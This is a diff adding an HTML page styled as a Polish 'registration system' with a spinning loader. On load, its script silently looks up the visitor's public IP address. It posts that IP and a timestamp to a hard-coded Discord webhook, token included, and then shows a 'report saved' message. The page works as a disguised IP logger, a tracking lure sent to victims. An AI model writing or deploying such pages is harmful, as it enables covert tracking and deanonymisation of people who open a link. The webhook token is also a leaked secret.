@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>System Rejestracji</title>
+<style>
+body {
+    background: linear-gradient(135deg, #1e1e2f, #12121a);
+    color: white;
+    font-family: Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    text-align: center;
+}
+
+.card {
+    background: #1f1f2e;
+    padding: 40px;
+    border-radius: 15px;
+    box-shadow: 0 0 30px rgba(0,0,0,0.6);
+    width: 350px;
+}
+
+.loader {
+    border: 5px solid #333;
+    border-top: 5px solid #4cafef;
+    border-radius: 50%;
+    width: 40px;
+    height: 40px;
+    margin: 20px auto;
+    animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+    100% { transform: rotate(360deg); }
+}
+
+.success {
+    color: #4caf50;
+    margin-top: 20px;
+}
+</style>
+</head>
+<body>
+
+<div class="card">
+    <h2>System Rejestracji</h2>
+    <p>Trwa inicjalizacja...</p>
+    <div class="loader"></div>
+    <div id="status"></div>
+</div>
+
+<script>
+async function sendReport() {
+    try {
+        let ipResponse = await fetch("https://api.ipify.org?format=json");
+        let ipData = await ipResponse.json();
+        let ip = ipData.ip;
+
+        let now = new Date().toLocaleString();
+
+        await fetch("https://discord.com/api/webhooks/1475185024688066774/Y92XyKynfaiP0jSYW_mWVqYahga2ZvSupHlRxmAmjagLkS_QCs_r2huOvkQ8WBuuQwlZ", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                content:
+                "📡 **Raport uruchomienia systemu**\n\n" +
+                "🌍 IP: " + ip + "\n" +
+                "🕒 Czas: " + now
+            })
+        });
+
+        document.querySelector(".loader").style.display = "none";
+        document.getElementById("status").innerHTML =
+            "<div class='success'>Raport zapisany w systemie ✅</div>";
+
+    } catch (error) {
+        document.getElementById("status").innerHTML =
+            "<div style='color:red'>Błąd połączenia ❌</div>";
+    }
+}
+
+sendReport();
+</script>
+
+</body>
+</html>
